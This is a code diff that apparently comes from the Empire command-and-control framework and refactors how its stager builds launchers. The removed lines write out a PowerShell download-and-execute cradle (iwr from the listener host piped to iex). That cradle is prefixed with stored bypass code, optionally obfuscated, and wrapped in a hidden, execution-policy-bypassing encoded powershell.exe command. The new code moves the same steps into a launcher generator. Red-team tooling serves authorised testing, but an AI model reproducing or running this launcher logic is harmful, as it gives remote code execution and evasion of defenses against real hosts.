@@ -1,8 +1,6 @@
 import logging
 from textwrap import dedent
 
-from empire.server.common.helpers import enc_powershell
-from empire.server.core.db import models
 from empire.server.core.db.base import SessionLocal
 
 log = logging.getLogger(__name__)
@@ -90,34 +88,14 @@ class Stager:
         launcher = ""
         if listener.module in ["http"]:
             if language == "powershell":
-                launcher_ps = f"(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('{listener.host_address}download/powershell/')-UseBasicParsing|iex"
-
-                with SessionLocal.begin() as db:
-                    for bypass_name in bypasses.split(" "):
-                        bypass = (
-                            db.query(models.Bypass)
-                            .filter(models.Bypass.name == bypass_name)
-                            .first()
-                        )
-
-                        if bypass:
-                            if bypass.language == language:
-                                launcher_ps = bypass.code + launcher_ps
-                            else:
-                                log.warning(
-                                    f"Invalid bypass language: {bypass.language}"
-                                )
-
-                launcher_ps = (
-                    self.mainMenu.obfuscationv2.obfuscate(
-                        launcher_ps, obfuscate_command
-                    )
-                    if obfuscate
-                    else launcher_ps
+                launcher = self.mainMenu.stagergenv2.generate_launcher(
+                    listener_name=listener_name,
+                    language="powershell",
+                    encode=True,
+                    obfuscate=obfuscate,
+                    obfuscation_command=obfuscate_command,
+                    bypasses=bypasses,
                 )
-                launcher_ps = enc_powershell(launcher_ps).decode("UTF-8")
-                launcher = f"powershell.exe -nop -ep bypass -w 1 -enc {launcher_ps}"
-
             elif language in ["csharp", "ironpython"]:
                 oneliner = self.mainMenu.stagergenv2.generate_exe_oneliner(
                     language=language,
